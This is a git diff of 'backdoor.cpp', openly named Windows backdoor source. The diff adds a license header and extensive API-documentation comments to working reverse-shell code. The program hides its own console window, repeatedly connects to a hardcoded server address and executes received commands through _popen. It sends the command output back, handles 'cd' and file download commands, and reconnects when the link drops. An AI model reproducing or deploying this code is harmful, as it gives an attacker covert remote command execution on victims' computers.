@@ -1,3 +1,58 @@
+/** 
+ * MIT License 
+ *
+ * Copyright 2017 s3q
+ *
+ * Permission is hereby granted, free of charge, to any person obtaining a copy
+ * of this software and associated documentation files (the "Software"), to deal
+ * in the Software without restriction, including without limitation the rights
+ * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
+ * copies of the Software, and to permit persons to whom the Software is 
+ * furnished to do so, subject to the following conditions:
+ 
+ * The above copyright notice and this permission notice shall be included in 
+ * all copies or substantial portions of the Software.
+ *
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+ * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, 
+ * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE 
+ * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER 
+ * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, 
+ * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE 
+ * SOFTWARE.
+ *
+ * /////////////////////////////////////////////////////////////////////////////
+ * 
+ * Name: backdoor.cpp
+ *
+ * Description: 
+ *
+ * Sources:
+ *   1. winbase.h header : https://docs.microsoft.com/en-us/windows/win32/api/winbase/
+ *   2. unistd.h header: https://www.ibm.com/docs/en/aix/7.2?topic=files-unistdh-file
+ *   3. ws2tcpip.h header : https://docs.microsoft.com/en-us/windows/win32/api/ws2tcpip/
+ *   4. fstream : https://www.cplusplus.com/reference/fstream/fstream/
+ *   5. cstdlib : https://www.cplusplus.com/reference/cstdlib/
+ 
+ *   6. WinMain function : https://docs.microsoft.com/en-us/windows/win32/learnwin32/winmain--the-application-entry-point 
+ *   7. AllocConsole function : https://docs.microsoft.com/en-us/windows/console/allocconsole
+ *   8. FindWindowA function : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
+ *   9. ShowWindow function :  https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+ *   10. WSAStartup function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup
+ *   11. ZeroMemory function : https://docs.microsoft.com/en-us/previous-versions/windows/desktop/legacy/aa366920(v=vs.85)
+ *   12. htons function :  https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-htons
+ *   13. recv function : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
+ *   14. connect function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
+ *   15. send function : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
+ *   16. fgets function : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160 
+ *   8. 
+ *   
+
+ *
+ * Notes:
+ * 
+ * 
+*/
 
 #ifdef _WIN32
 #include <Windows.h>
@@ -19,6 +74,9 @@ using namespace std;
 
 int sock;
 
+/**
+ * convert addition command to executable command 
+*/
 string Additions(char *buffer);
 // Extensions Function:
 string CE_InfoExt(string buffer);
@@ -26,97 +84,364 @@ string CE_RunExt(string buffer);
 string CE_StartupExt(string buffer);
 string CE_StopExt(string buffer);
 
+/**
+ * check if includes in string 
+*/
 int strincludes(char *strVar, char *buffer);
+
+/**
+ * slice string 
+*/
 char *strsub(char str[], int slice_from, int slice_to);
 
 void download_file(char *filename);
 
-int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR pCmdLine, int nCmdShow)
+/**
+ * APIENTRY is an alias for WINAPI.
+ * HWND is a "handle to a window" and is part of the Win32 API 
+ * The LPSTR type and its alias PSTR specify a pointer to an array of 8-bit characters, which MAY be terminated by a null character.
+*/
+/**
+ * Every Windows program includes an entry-point function that is named either WinMain or wWinMain. Here is the signature for wWinMain.
+*/
+int APIENTRY WinMain(
+    /**
+     * hInstance is something called a "handle to an instance" or "handle to a module." The operating system uses this value to identify the executable (EXE) when it is loaded in memory. 
+     * The instance handle is needed for certain Windows functions—for example, to load icons or bitmaps.
+    */
+    HINSTANCE hInstance, 
+
+    // hPrevInstance has no meaning. It was used in 16-bit Windows, but is now always zero.
+    HINSTANCE hPrevInstance, 
+
+    // pCmdLine contains the command-line arguments as a Unicode string.
+    LPSTR pCmdLine, 
+   
+    // nCmdShow is a flag that says whether the main application window will be minimized, maximized, or shown normally.
+    int nCmdShow)
 {
 
+    // handle to a window
     HWND stealth;
 
+    /**
+     * Allocates a new console for the calling process.
+     * 
+     * Return value :
+     * If the function succeeds, the return value is nonzero.
+     * 
+     * moreinfo : https://docs.microsoft.com/en-us/windows/console/allocconsole
+    */
     AllocConsole();
 
+    /**
+     * Retrieves a handle to the top-level window whose class name and window name match the specified strings. 
+     * 
+     * Parameters :
+     * LPCSTR lpClassName -> The class name or a class atom created by a previous call to the RegisterClass or RegisterClassEx function. The atom must be in the low-order word of lpClassName; the high-order word must be zero.
+     *                      If lpClassName is NULL, it finds any window whose title matches the lpWindowName parameter.
+     * LPCSTR lpWindowName -> The window name (the window's title). If this parameter is NULL, all window names match.
+     * 
+     * Return value : HWND
+     * If the function succeeds, the return value is a handle to the window that has the specified class name and window name.
+     * If the function fails, the return value is NULL. To get extended error information, call GetLastError.
+     *
+     * Remarks :
+     * If the lpWindowName parameter is not NULL, FindWindow calls the GetWindowText function to retrieve the window name for comparison.
+     * 
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-findwindowa
+    */
     stealth = FindWindowA("ConsoleWindowClass", NULL);
 
+    /**
+     * Sets the specified window's show state.
+     *
+     * Parameters :
+     * HWND hWnd -> A handle to the window.
+     * int nCmdShow -> Controls how the window is to be shown 
+     * 
+     * Return value : int
+     *   - SW_HIDE -> 0 -> Hides the window and activates another window. 
+     *   - SW_NORMAL -> 1 -> Activates and displays a window. If the window is minimized or maximized, the system restores it to its original size and position. An application should specify this flag when displaying the window for the first time.
+     *   - SW_SHOWMINIMIZED -> 2 -> Activates the window and displays it as a minimized window.
+     *   - ...
+     *   - moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-showwindow
+     * Remarks :
+     * To perform certain special effects when showing or hiding a window, use AnimateWindow.
+    */
     ShowWindow(stealth, 0);
 
+    /**
+     * The sockaddr structure varies depending on the protocol selected. Except for the sin*_family parameter, sockaddr contents are expressed in network byte order.
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-sockaddr_in
+    */
     sockaddr_in ServAdrr;
-    // unsigned short ServPort = DEFAULT_PORT;
     char ServIp[16] = "192.168.1.36";
 
+    /**
+     * The WSADATA structure contains information about the Windows Sockets implementation.
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata
+    */
     WSADATA wsaData;
 
-    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0)
+    // if not initialzed successuflly : 
+    if (
+        /**
+     * The WSAStartup function initiates use of the Winsock DLL by a process.
+     
+     * Parameters :
+     * WORD wVersionRequired ->
+     * LPWSADATA lpWSAData ->
+     
+     * Return value : int
+     * If successful, the WSAStartup function returns zero. Otherwise, it returns one of the error codes listed below.  
+     *   - WSASYSNOTREADY -> The underlying network subsystem is not ready for network communication.
+     *   - WSAVERNOTSUPPORTED -> The version of Windows Sockets support requested is not provided by this particular Windows Sockets implementation.
+     *   - WSAEINPROGRESS -> A blocking Windows Sockets 1.1 operation is in progress.
+     *   - WSAEPROCLIM -> 	A limit on the number of tasks supported by the Windows Sockets implementation has been reached.
+     *   - WSAEFAULT -> The lpWSAData parameter is not a valid pointer.
+     * 
+     * Remarks :
+     * The WSAStartup function must be the first Windows Sockets function called by an application or DLL. It allows an application or DLL to specify the version of Windows Sockets required and retrieve details of the specific Windows Sockets implementation. The application or DLL can only issue further Windows Sockets functions after successfully calling WSAStartup.
+     * 
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup 
+    */
+        WSAStartup(
+            /**
+         * Creates a WORD value by concatenating the specified values.
+         * 
+         * Parameters :
+         * BYTE bLow -> The low-order byte of the new value.
+         * BYTE bHigh -> The high-order byte of the new value.
+         * 
+         * Return value : WORD
+         * The return value is a WORD value.
+        */
+            MAKEWORD(2, 0), &wsaData) != 0)
     {
         exit(1);
     }
+
+// breack point for reconnecte to server :
 tryc:
+
+    /**
+     * The socket function creates a socket that is bound to a specific transport service provider.
+     * 
+     * Parameters :
+     * int af -> The address family specification : 
+     *   - AF_UNSPEC -> 0 -> The address family is unspecified.
+     *   - AF_INET -> 2 -> The Internet Protocol version 4 (IPv4) address family.
+     *   - AF_IPX -> 6 -> The IPX/SPX address family.
+     *   - AF_APPLETALK -> 16 -> The AppleTalk address family. This address family is only supported if the AppleTalk protocol is installed.
+     *   - AF_NETBIOS -> 17 -> The NetBIOS address family. This address family is only supported if the Windows Sockets provider for NetBIOS is installed.
+     *   - AF_INET6 -> 23 -> The Internet Protocol version 6 (IPv6) address family.
+     *   - AF_IRDA -> 26 -> The Infrared Data Association (IrDA) address family.
+     *   - AF_BTH -> 32 -> The Bluetooth address family.
+     * int type -> The type specification for the new socket :
+     *   - SOCK_STREAM -> 1 -> A socket type that provides sequenced
+     *   - SOCK_DGRAM -> 2 -> A socket type that supports datagrams
+     *   - SOCK_RAW -> 3 -> A socket type that provides a raw socket that allows an application to manipulate the next upper-layer protocol header
+     *   - SOCK_RDM -> 4 -> A socket type that provides a reliable message datagram.
+     *   - SOCK_SEQPACKET -> 5 -> A socket type that provides a pseudo-stream packet based on datagrams.
+     * 
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket 
+    */
     sock = socket(AF_INET, SOCK_STREAM, 0);
 
+    /**
+     * Fills a block of memory with zeros, for setting it empty
+     * 
+     * Parameters :
+     * PVOID Destination -> A pointer to the starting address of the block of memory to fill with zeros.
+     * SIZE_T Length -> The size of the block of memory to fill with zeros, in bytes.
+    */
     ZeroMemory(&ServAdrr, sizeof(ServAdrr));
+
+    // identification ServAdrr :
     ServAdrr.sin_family = AF_INET;
-    ServAdrr.sin_addr.S_un.S_addr = inet_addr(ServIp);
-    ServAdrr.sin_port = htons(DEFAULT_PORT);
+    ServAdrr.sin_addr.S_un.S_addr =
+        /**
+     * The inet_addr function converts a string containing an IPv4 dotted-decimal address into a proper address for the IN_ADDR structure.
+     * 
+     * Parameters :
+     * const char *cp -> ip string
+    */
+        inet_addr(ServIp);
 
-    // cout << "[+] - " << ServAdrr.sin_addr.S_un.S_addr << endl;
+    ServAdrr.sin_port =
+        /**
+     * The htons function converts a u_short from host to TCP/IP network byte order (which is big-endian).
+     * 
+     * Parameters :
+     * u_short hostshort -> A 16-bit number in host byte order.
+     * 
+     * Return value :
+     * The htons function returns the value in TCP/IP network byte order.
+    */
+        htons(DEFAULT_PORT);
 
+// try to connect to server if not connected until now :
 start:
-    int resCon = connect(sock, (struct sockaddr *)&ServAdrr, sizeof(ServAdrr));
+
+    /**
+     * The connect function establishes a connection to a specified socket.
+     * 
+     * Parameters :
+     * SOCKET s -> A descriptor identifying an unconnected socket. -> socket function
+     * const sockaddr *name -> A pointer to the sockaddr structure to which the connection should be established.
+     * int namelen -> The length, in bytes, of the sockaddr structure pointed to by the name parameter.
+     * 
+     * Return value :
+     * If no error occurs, connect returns zero. Otherwise, it returns SOCKET_ERROR, and a specific error code can be retrieved by calling WSAGetLastError.
+     *   - WSANOTINITIALISED -> A successful WSAStartup call must occur before using this function.
+     *   - WSAENETDOWN -> A The network subsystem has failed.
+     * 
+     * Remarks : 
+     * Until the connection attempt completes on a nonblocking socket, all subsequent calls to connect on the same socket will fail with the error code WSAEALREADY, and WSAEISCONN when the connection completes successfully. 
+     * Due to ambiguities in version 1.1 of the Windows Sockets specification, error codes returned from connect while a connection is already pending may vary among implementations. As a result, it is not recommended that applications use multiple calls to connect to detect connection completion. 
+     * If they do, they must be prepared to handle WSAEINVAL and WSAEWOULDBLOCK error values the same way that they handle WSAEALREADY, to assure robust operation.
+     * 
+     * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-connect
+    */
+    int resCon = connect(sock,
+                         // The sockaddr structure varies depending on the protocol selected. Except for the sin*_family parameter, sockaddr contents are expressed in network byte order.
+                         (struct sockaddr *)&ServAdrr, sizeof(ServAdrr));
+
+    // if not connected :
     while (resCon != 0)
     {
         sleep(10);
         cout << "Try to connection " << endl;
+        // try to connect to server again :
         goto start;
     }
+
+    // if connection is established
     if (resCon == 0)
     {
         printf("[+] - Connected ^_^\n");
     }
 
+    //  receives data ( command ) from a connected socket ( server )
     char buffer[DEFAULT_BUFLEN];
+    // container is one line of response when execute the code, and add it to total_response
     char container[DEFAULT_BUFLEN];
+    // total response of command which exexuted and will send it to connected socket ( server ) :
     char total_response[DEFAULT_TOTALE_BUFLEN];
 
-    cout << "[RECV]" << endl;
+    // cout << "[RECV]" << endl;
 
     while (true)
     {
     jumb:
+        // Fills a block of memory with zeros, for setting it empty :
         ZeroMemory(buffer, sizeof(buffer));
         ZeroMemory(container, sizeof(container));
         ZeroMemory(total_response, sizeof(total_response));
 
         // int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);
+        /**
+         * The recv function receives data from a connected socket or a bound connectionless socket.
+         * 
+         * Parameters :
+         * SOCKET s -> The descriptor that identifies a connected socket. -> socket function 
+         * char *buf -> A pointer to the buffer to receive the incoming data.
+         * int len -> The length, in bytes, of the buffer pointed to by the buf parameter.
+         * int flags -> A set of flags that influences the behavior of this function
+         * 
+         * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv
+         * 
+         * Return value :
+         * If no error occurs, recv returns the number of bytes received and the buffer pointed to by the buf parameter will contain this data received. 
+         * If the connection has been gracefully closed, the return value is zero.
+         *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
+         *   - WSAENETDOWN - The network subsystem has failed.
+        */
         int bytesRecv = recv(sock, buffer, sizeof(buffer), 0);
 
         cout << "[CMD] - " << buffer << endl;
 
+        // filed receives data ( error in socket ) : 
         if (bytesRecv == SOCKET_ERROR)
         {
             cerr << "[ERR] - Error in recv() ! . Quitting" << endl;
+            // try to connect maybe the server is disconnected :
             goto tryc;
         }
 
+        // The connection has been disconnected :
         if (bytesRecv == 0)
         {
             cout << "[ERR] - Server disconnected " << endl;
+            // try to connect the server :
             goto tryc;
         }
 
         cout << "[CMD] - " << buffer << endl;
 
+        // quit : close socket and exit : 
         if (strncmp("q", buffer, 1) == 0)
         {
+            /**
+             * The closesocket function closes an existing socket.
+             * 
+             * Paramters :
+             * SOCKET s -> A descriptor identifying the socket to close.
+             * 
+             * Return value :
+             * If no error occurs, closesocket returns zero. Otherwise, a value of SOCKET_ERROR is returned, and a specific error code can be retrieved by calling WSAGetLastError.
+             * 
+             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-closesocket
+            */
             closesocket(sock);
+
+            /**
+             * The WSACleanup function terminates use of the Winsock 2 DLL (Ws2_32.dll).
+             * 
+             * Return value :
+             * The return value is zero if the operation was successful. Otherwise, the value SOCKET_ERROR is returned, and a specific error number can be retrieved by calling WSAGetLastError.
+             * 
+             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup
+            */
             WSACleanup();
+
             exit(0);
         }
+
+        // change dir :  
         else if (strncmp("cd ", buffer, 3) == 0)
         {
+            /**
+             * Changes the current working directory.
+             * 
+             * Paramters :
+             * const char *dirname
+             * 
+             * Return value : 
+             * These functions return a value of 0 if successful. A return value of -1 indicates failure
+            */
             chdir(strsub(buffer, 3, 100));
-            // strcpy(total_response, strsub(buffer, 3, 100));
+
+            /**
+             * The send function sends data on a connected socket.
+             * 
+             * Paramters : 
+             * SOCKET s -> A descriptor identifying a connected socket.
+             * char *buf -> A pointer to a buffer containing the data to be transmitted.
+             * int len -> The length, in bytes, of the data in buffer pointed to by the buf parameter.
+             * int flags -> A set of flags that specify the way in which the call is made :
+             *   - MSG_DONTROUTE -> Specifies that the data should not be subject to routing. A Windows Sockets service provider can choose to ignore this flag.
+             *   - MSG_OOB -> Sends OOB data (stream-style socket such as SOCK_STREAM only.
+             * 
+             * Return value : 
+             * If no error occurs, send returns the total number of bytes sent, which can be less than the number requested to be sent in the len parameter.
+             * 
+             *   - WSANOTINITIALISED - A successful WSAStartup call must occur before using this function.
+             *   - WSAENETDOWN - The network subsystem has failed.
+             * 
+             * moreinfo : https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-send
+            */
             send(sock, total_response, sizeof(total_response), 0);
         }
         else if (strncmp("download ", buffer, 9) == 0)
@@ -130,21 +455,59 @@ start:
 
         else
         {
-
+            // set buffer to additions and custom commands if contained
             strcpy(buffer, Additions(buffer).c_str());
 
-            FILE *fp;
-            fp = _popen(buffer, "rt");
+            /**
+             * Creates a pipe and executes a command.
+             * 
+             * Paramters :
+             * const char *command -> Command to be executed.
+             * const char *mode -> Mode of the returned stream : 
+             *   - r -> The calling process can read the spawned command's standard output using the returned stream.
+             *   - w -> The calling process can write to the spawned command's standard input using the returned stream.
+             *   - b -> Open in binary mode.
+             *   - t -> Open in text mode.
+             * 
+             * moreinfo : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/popen-wpopen?view=msvc-160
+            */
+            FILE *fp = _popen(buffer, "rt");
+
+            /**
+             * Get a string from a stream.
+             * 
+             * Paramters :
+             * char *str -> Storage location for data.
+             * int numChars -> Maximum number of characters to read.
+             * FILE *stream -> Pointer to FILE structure.
+             * 
+             * Return value : 
+             * Each of these functions returns str. NULL is returned to indicate an error or an end-of-file condition. 
+             * Use feof or ferror to determine whether an error occurred.
+             * 
+             * moreinfo -> https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fgets-fgetws?view=msvc-160
+            */
             while (fgets(container, 4096, fp))
             {
+                // add line of command ( container ) to total_response 
                 strcat(total_response, container);
             }
+            
+            // when finish read all response comamnd : 
             if (feof(fp))
             {
 
-                printf("[TRES] - %s\n", total_response);
+                // send response command :
                 send(sock, total_response, sizeof(total_response), 0);
 
+                /**
+                 * Waits for a new command processor and closes the stream on the associated pipe.
+                 * 
+                 * Paramters : 
+                 * FILE *stream -> Return value from the previous call to _popen.
+                 * 
+                 * moreinfo : https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/pclose?view=msvc-160
+                */
                 _pclose(fp);
             }
         }
@@ -227,10 +590,10 @@ string Additions(char *buffer)
     return obuf;
 }
 
-/*
-######################################
-            Extensions
-######################################
+/**
+ * ######################################
+ *            Extensions
+ * ######################################
 */
 string CE_InfoExt(string buffer)
 {
